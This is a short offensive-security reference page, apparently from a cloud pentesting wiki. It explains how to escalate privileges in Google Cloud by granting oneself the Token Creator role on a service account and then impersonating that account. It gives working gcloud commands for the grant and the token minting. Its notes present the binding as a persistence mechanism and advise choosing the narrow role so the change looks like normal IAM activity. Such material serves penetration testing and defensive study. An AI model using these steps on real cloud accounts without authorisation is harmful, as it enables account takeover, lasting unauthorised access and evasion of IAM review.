---
title: "Token Creator grant: bind yourself to impersonate a service account"
description: "Granting yourself roles/iam.serviceAccountTokenCreator on a target by calling iam.serviceAccounts.setIamPolicy, then impersonating it."
keywords:
  - Token Creator
  - serviceAccounts.setIamPolicy
  - IAM binding
  - impersonation
  - service account
---

# Token Creator grant

When you hold `iam.serviceAccounts.setIamPolicy` on a service account but not yet the right to impersonate it, you grant yourself `roles/iam.serviceAccountTokenCreator` on that account and then mint its tokens. It is the setIamPolicy privesc scoped to a single service account, and it opens the door to every impersonation technique.

## Grant then impersonate

```bash
gcloud iam service-accounts add-iam-policy-binding <target>@<proj>.iam.gserviceaccount.com \
  --member "user:you@example.com" \
  --role roles/iam.serviceAccountTokenCreator

# now mint the target's token
gcloud auth print-access-token --impersonate-service-account <target>@<proj>.iam.gserviceaccount.com
```

## Exploitation notes

- `serviceAccounts.setIamPolicy` on a privileged SA is itself a full escalation path through this grant.
- The binding is durable: it survives until removed, a persistence hook as well as an escalation.
- Prefer granting the narrow Token Creator role over Owner on the SA to stay closer to normal-looking IAM.

## Tools

- **gcloud** (`iam service-accounts add-iam-policy-binding`).

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Google: service account impersonation](https://cloud.google.com/iam/docs/service-account-impersonation)
